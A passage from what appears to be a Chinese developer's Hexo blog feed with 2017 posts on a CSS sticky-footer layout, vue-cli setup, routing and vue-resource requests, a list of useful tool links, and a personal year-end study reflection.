data-srcset="https://cdn.zhengxiangling.com/17-8-4/17778041.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p>]]></content>
      
      
      <categories>
          
          <category> 服务器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> https </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS-Sticky-Footer 布局</title>
      <link href="/2017/07/27/CSS-Sticky-Footer%E5%B8%83%E5%B1%80/"/>
      <url>/2017/07/27/CSS-Sticky-Footer%E5%B8%83%E5%B1%80/</url>
      
        <content type="html"><![CDATA[<p>这个布局是用来实现，让底部信息（例如版权）始终保持在页面最底部的效果。</p><span id="more"></span><p>类似于下面图片的效果，让关闭按钮始终保持在最底部。</p><p><img src="https://cdn.zhengxiangling.com/10717719.jpg" class="lazyload" data-srcset="https://cdn.zhengxiangling.com/10717719.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- body --&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;content&quot;</span>&gt;</span>content<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;push&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;footer&quot;</span>&gt;</span>footer<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>container</code>的负底部外边距与<code>footer</code>和<code>push</code>的高度相同。<code>push</code>的作用是将<code>footer</code>推下去，否则<code>content</code>内容太多时会与<code>footer</code>重叠。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;</span><br><span class="line">* &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">html</span>,</span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.container</span> &#123;</span><br><span class="line">    <span class="attribute">min-height</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span> auto -<span class="number">100px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.footer</span>,</span><br><span class="line"><span class="selector-class">.push</span> &#123;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS布局 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vue-cli脚手架使用（二）-- vue-resource数据请求、引用公共css文件</title>
      <link href="/2017/07/27/vue-cli%E8%84%9A%E6%89%8B%E6%9E%B6%E4%BD%BF%E7%94%A8%EF%BC%88%E4%BA%8C%EF%BC%89-vue-resource%E6%95%B0%E6%8D%AE%E8%AF%B7%E6%B1%82%E3%80%81%E5%BC%95%E7%94%A8%E5%85%AC%E5%85%B1css%E6%96%87%E4%BB%B6/"/>
      <url>/2017/07/27/vue-cli%E8%84%9A%E6%89%8B%E6%9E%B6%E4%BD%BF%E7%94%A8%EF%BC%88%E4%BA%8C%EF%BC%89-vue-resource%E6%95%B0%E6%8D%AE%E8%AF%B7%E6%B1%82%E3%80%81%E5%BC%95%E7%94%A8%E5%85%AC%E5%85%B1css%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<p>vue与后台请求数据有自己的请求方式，这里用的是<code>vue-resource</code>。<br>当写有公共<code>css</code>时，可以引用<code>@import</code>到组件中使用。</p><h3 id="vue-resource"><a href="#vue-resource" class="headerlink" title="vue-resource"></a>vue-resource</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装."></a>安装.</h4><pre><code>$ npm install vue-resource</code></pre><span id="more"></span><h4 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h4><p>src&#x2F;main.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App&#x27;</span></span><br><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">&#x27;./router&#x27;</span></span><br><span class="line"><span class="comment">// 引用vue-resource</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">VueResource</span> <span class="keyword">from</span> <span class="string">&#x27;vue-resource&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="注册"><a href="#注册" class="headerlink" title="注册"></a>注册</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">&#x27;./router&#x27;</span></span><br><span class="line"><span class="comment">// 引用vue-resource</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">VueResource</span> <span class="keyword">from</span> <span class="string">&#x27;vue-resource&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 注册</span></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">VueResource</span>)</span><br></pre></td></tr></table></figure><h4 id="请求数据"><a href="#请求数据" class="headerlink" title="请求数据"></a>请求数据</h4><p>官方给的例子</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="comment">// GET /someUrl</span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">$http</span>.<span class="title function_">get</span>(<span class="string">&#x27;/someUrl&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get body data</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">someData</span> = response.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">  &#125;, <span class="function"><span class="params">response</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// error callback</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>error callback 可以不写</p><p>App.vue</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  data () &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="attr">my_value</span>: &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  created () &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">$http</span>.<span class="title function_">get</span>(url).<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">my_value</span> = response.<span class="property">body</span>.<span class="property">data</span>  </span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用<code>created</code>钩子，当<code>created</code>时就请求数据。</p><p><code>response.body.data</code> 返回的是一个对象</p><p>用<code>my_value</code>来接收数据。</p><p>将父组件值传递给子组件</p><p>如父组件有一个子组件</p><pre><code>&lt;v-header&gt;&lt;/v-header&gt;</code></pre><p>用<code>v-bind</code>将值传递给子组件</p><pre><code>&lt;v-header v-bind:my_value=&quot;my_value&quot;&gt;&lt;/v-header&gt;</code></pre><p>(v-bind:my_value可以缩写为 :my_value)</p><p>子组件要用props来接受值的传递</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="title function_">data</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> &#123;&#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">props</span>: &#123;</span><br><span class="line">    <span class="attr">my_value</span>: &#123;</span><br><span class="line">      <span class="attr">type</span>: <span class="title class_">Object</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就可以和<code>data</code>里面的数据一样用 大胡子语法 来使用了。</p><p>引用公共<code>css</code>文件<br>如有 common&#x2F;scss&#x2F;common.scss 文件</p><p>引用方式 （@import）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;style lang=&quot;scss&quot; rel=&quot;stylesheet/scss&quot;&gt;</span><br><span class="line">  <span class="keyword">@import</span> <span class="string">&quot;..路径/common/scss/common.scss&quot;</span>;</span><br><span class="line">  ...</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 爬坑 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
            <tag> scss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vue-cli脚手架使用（一）-- 起步、组件、路由</title>
      <link href="/2017/07/25/vue-cli%E8%84%9A%E6%89%8B%E6%9E%B6%E4%BD%BF%E7%94%A8%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2017/07/25/vue-cli%E8%84%9A%E6%89%8B%E6%9E%B6%E4%BD%BF%E7%94%A8%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>使用vue-cli脚手架之前，建议对vue有一定了解之后再使用构建工具。</p><h3 id="起步"><a href="#起步" class="headerlink" title="起步"></a>起步</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 全局安装 vue-cli</span></span><br><span class="line">$ npm install --global vue-cli</span><br><span class="line"><span class="comment"># 创建一个基于 webpack 模板的新项目</span></span><br><span class="line">$ vue init webpack my-project</span><br><span class="line"><span class="comment"># 安装依赖，走你</span></span><br><span class="line">$ <span class="built_in">cd</span> my-project</span><br><span class="line">$ npm install</span><br><span class="line">$ npm run dev</span><br><span class="line"></span><br></pre></td></tr></table></figure><span id="more"></span><h4 id="vue-init-webpack-my-project"><a href="#vue-init-webpack-my-project" class="headerlink" title="vue init webpack my-project"></a>vue init webpack my-project</h4><p>执行完 <code>vue init webpack my-project</code>之后会有下列提示<br><img src="https://cdn.zhengxiangling.com/44601160.jpg" class="lazyload" data-srcset="https://cdn.zhengxiangling.com/44601160.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>其中ESlint为js代码规范检测，不符合代码规范的会直接报错，而不是警告。</p><p>Karma + Mocha + e2e 都是测试工具，用不到可以不用安装。</p><p>脚手架中npm run 分两种模式，一种dev开发模式，另一种bulid生产模式</p><h4 id="npm-install"><a href="#npm-install" class="headerlink" title="npm install"></a>npm install</h4><p>之后玩之后的文件夹目录结构<br><img src="https://cdn.zhengxiangling.com/47660429.jpg" class="lazyload" data-srcset="https://cdn.zhengxiangling.com/47660429.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>其中</p><ul><li>config <br>index.js 有修改npm run dev 的端口号 (port).</li><li>src<br>components放vue模板<br>router里index.js为路由的相关配置<br>App.vue 为主.vue<br>main.js 为主 .js配置</li><li>   根目录<br>   index.html为html主入口</li></ul><h3 id="vue-中使用css预处理器"><a href="#vue-中使用css预处理器" class="headerlink" title=".vue 中使用css预处理器"></a>.vue 中使用css预处理器</h3><p>例如安装sass<br>法一：找到根路径的package.json</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="string">&quot;sass-loader&quot;</span>: <span class="string">&quot;^6.0.6&quot;</span>,</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>找到dependencies加入<code>&quot;sass-loader&quot;: &quot;^6.0.6&quot;</code>，^代表版本大于等于所填版本号。<br>然后执行</p><pre><code>$ npm install</code></pre><p>法二：</p><pre><code>npm install sass-loader  --save</code></pre><p>然后就可以在 .vue中使用sass了</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;style lang=&quot;scss&quot; rel=&quot;stylesheet/scss&quot;&gt;</span><br><span class="line">  <span class="selector-tag">h1</span> &#123; <span class="attribute">color</span>: <span class="number">#666</span> &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><h3 id="使用组件"><a href="#使用组件" class="headerlink" title="使用组件"></a>使用组件</h3><p>在components中新建header文件夹，里面新建header.vue文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;header&quot;</span>&gt;</span></span><br><span class="line">我是header</span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/ecmascript-6&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">export</span> <span class="keyword">default</span> &#123;&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span> <span class="attr">lang</span>=<span class="string">&quot;scss&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet/scss&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure><p>注意，要在script写<code>export default &#123;&#125;</code>导出该模板</p><p>然后在App.vue中引入该组件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="comment">// 引入 header.vue 组件</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Header</span> <span class="keyword">from</span> <span class="string">&#x27;./components/header/header.vue&#x27;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;app&#x27;</span>,</span><br><span class="line">  <span class="comment">// 注册该组件，标签名为 v-header</span></span><br><span class="line">  <span class="attr">components</span>: &#123;</span><br><span class="line">    <span class="string">&#x27;v-header&#x27;</span>: <span class="title class_">Header</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>然后就可以在template中使用该组件了</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;header&quot;</span>&gt;</span>I am header<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">v-header</span>&gt;</span><span class="tag">&lt;/<span class="name">v-header</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="使用路由"><a href="#使用路由" class="headerlink" title="使用路由"></a>使用路由</h3><p>在router中index.js配置路由</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">Goods</span> <span class="keyword">from</span> <span class="string">&#x27;@/components/goods/goods&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Ratings</span> <span class="keyword">from</span> <span class="string">&#x27;@/components/ratings/ratings&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">Vue</span>.<span class="title function_">use</span>(<span class="title class_">Router</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> <span class="title class_">Router</span>(&#123;</span><br><span class="line">  <span class="attr">routes</span>: [&#123;</span><br><span class="line">      <span class="attr">path</span>: <span class="string">&#x27;/goods&#x27;</span>,</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;goods&#x27;</span>,</span><br><span class="line">      <span class="attr">component</span>: <span class="title class_">Goods</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">path</span>: <span class="string">&#x27;/ratings&#x27;</span>,</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;ratings&#x27;</span>,</span><br><span class="line">      <span class="attr">component</span>: <span class="title class_">Ratings</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>其中Goods和Ratings为自己写好的放在components的组件。<br>其中</p><ul><li>@代表文件夹根路径，(可以在build&#x2F;webpack.base.conf.js中resolve找到)。</li><li>path 表示要注册的网页子链接</li><li>name 代表引用链接的别名，当链接很长时，使用name来写router-link时会很方便。</li><li>component 代表点击链接时router-view要显示的组件。</li></ul><p>然后就可以在App.vue中使用路由了</p><p>&#x2F;&#x2F; App.vue中</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;tab&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;tab-item&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">:to</span>=<span class="string">&quot;&#123; name: &#x27;goods&#x27;&#125;&quot;</span>&gt;</span>商品<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;tab-item&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">to</span>=<span class="string">&quot;/ratings&quot;</span>&gt;</span>评论<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">router-view</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;router-link&gt;&lt;/router-link&gt;</span><br></pre></td></tr></table></figure><p>会被渲染成<code>&lt;a&gt;&lt;/a&gt;</code>标签<br>链接填入有两种方式，直接填入型</p><ul><li><pre><code>to=&quot;/ratings&quot; 为直接链接</code></pre></li><li>   :to”{ name&#x3D;’goods’ }” 为取链接name型，name为router中index.js配置好的链接别名</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;router-view&gt;&lt;/router-view&gt;</span><br></pre></td></tr></table></figure><p>为点击链接后要显示内容</p><p>点击链接时，链接会默认有一个class类名router-link-exact-active，要想点击切换到自己自定义的class类名（方便修改样式），可以在src&#x2F;router&#x2F;index.js中配置</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> <span class="title class_">Router</span>(&#123;</span><br><span class="line">  <span class="attr">routes</span>: [&#123;</span><br><span class="line">      <span class="attr">path</span>: <span class="string">&#x27;/goods&#x27;</span>,</span><br><span class="line">      <span class="attr">name</span>: <span class="string">&#x27;goods&#x27;</span>,</span><br><span class="line">      <span class="attr">component</span>: <span class="title class_">Goods</span></span><br><span class="line">      &#125;</span><br><span class="line">    ...</span><br><span class="line">    ],</span><br><span class="line">  <span class="attr">linkActiveClass</span>: <span class="string">&#x27;active&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>其中<code>linkActiveClass: active</code>的active为自定义的类名，点击链接时就会额外加入自己自定义的class了。</p>]]></content>
      
      
      <categories>
          
          <category> 爬坑 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>好货分享（一）</title>
      <link href="/2017/07/16/%E5%A5%BD%E8%B4%A7%E5%88%86%E4%BA%AB%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2017/07/16/%E5%A5%BD%E8%B4%A7%E5%88%86%E4%BA%AB%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<ol><li>科学上网</li></ol><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://laod.cn/hosts/2017-google-hosts.html</span><br></pre></td></tr></table></figure><p>ps: 支持windows &amp; mac , linux &amp; android</p><span id="more"></span><ol start="2"><li>自己制作loading的gif图片<br>ps：可选gif,png,svg</li></ol><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://preloaders.net/</span><br></pre></td></tr></table></figure><p><img src="https://cdn.zhengxiangling.com/67567701.jpg" class="lazyload" data-srcset="https://cdn.zhengxiangling.com/67567701.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><ol start="3"><li>白色调二维码生成器</li></ol><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://spacekid.me/halftone-qr-code-generator/</span><br></pre></td></tr></table></figure><p>   <img src="https://cdn.zhengxiangling.com/qrcode.png" class="lazyload" data-srcset="https://cdn.zhengxiangling.com/qrcode.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><!--more--><ol start="4"><li>Tampermonkey（谷歌插件），可解析百度网盘链接</li></ol><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://tampermonkey.net/index.php?version=4.3.6&amp;ext=dhdg&amp;show=gcal</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2017学年个人总结</title>
      <link href="/2017/07/13/2017%E5%AD%A6%E5%B9%B4%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/"/>
      <url>/2017/07/13/2017%E5%AD%A6%E5%B9%B4%E4%B8%AA%E4%BA%BA%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>伴随最后一个月的泡图书馆复习，考完试，这个学期就这样结束了。</p><p>这学期能从课本收获到的专业知识最多的就数计算机网络原理、数据库了。更多的还是自学，大学的主要学习还得靠自学，虽然这学期上课经常神游到工作上的事情，然后意识过来的时候老师已经上到下一章节了，但是在最后一个月的抢救中还是补回来了。</p><span id="more"></span><p><img src="https://cdn.zhengxiangling.com/90138443.jpg" class="lazyload" data-srcset="https://cdn.zhengxiangling.com/90138443.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>让我大学生活丰富起来的，归属于课外的兴趣的学习（全栈开发）。兴趣还是得有的，不希望回过头来回忆大学生活的时候，就只剩下和老友开黑了（已经很久没接触游戏了，有时间只是看一些精彩集锦R闪回旋踢）。因为课外学习的东西，让我在做课设时几天就可以交作品检查了。</p><p>上半年学了git，bootstrap，sass，会用jqurey实现常用交互效果。</p><p>下半年开始了解真正的前端。今年前端多了很多东西，自从Node的出现。然后学习热情异常的高涨，了解了什么是单页面程序，webpack，vue，ES6，npm。</p><p><img src="https://cdn.zhengxiangling.com/69313449.jpg" class="lazyload" data-srcset="https://cdn.zhengxiangling.com/69313449.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>加上最近几个月接触的python框架Django，开始真正参与项目的制作，逐渐地积累项目经验。</p><p>一个月前搭建了自己的博客，域名还在备案中（备了好久了，最后管局审核还需要20个工作日 - 